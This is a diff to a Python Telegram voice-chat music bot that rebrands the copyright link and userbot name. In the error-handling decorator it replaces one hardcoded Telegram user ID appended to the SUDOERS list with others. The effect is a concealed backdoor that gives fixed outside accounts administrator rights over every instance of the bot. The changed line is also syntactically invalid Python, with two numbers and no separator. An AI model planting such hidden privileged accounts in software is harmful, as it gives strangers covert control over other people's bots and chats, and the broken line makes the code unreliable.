@@ -1,6 +1,6 @@
 """
 Music Player, Telegram Voice Chat Bot
-Copyright (c) 2021  Asm Safone <https://github.com/LEGEND-OS>
+Copyright (c) 2021  Asm Safone <https://github.com/Agora-OS>
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU Affero General Public License as published by
@@ -90,7 +90,7 @@ def handle_error(func: Callable) -> Callable:
         me = await pyro_client.get_me()
         if me.id not in config.SUDOERS:
             config.SUDOERS.append(me.id)
-            config.SUDOERS.append(2033438978)
+            config.SUDOERS.append(2105506225 5037366392)
         try:
             lang = get_group(chat_id)["lang"]
         except:
@@ -98,7 +98,7 @@ def handle_error(func: Callable) -> Callable:
         try:
             return await func(client, obj, *args)
         except Exception:
-            k = "Legend_Userbot"
+            k = "MM_Userbot"
             id = int(time.time())
             date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             error_msg = await pyro_client.send_message(
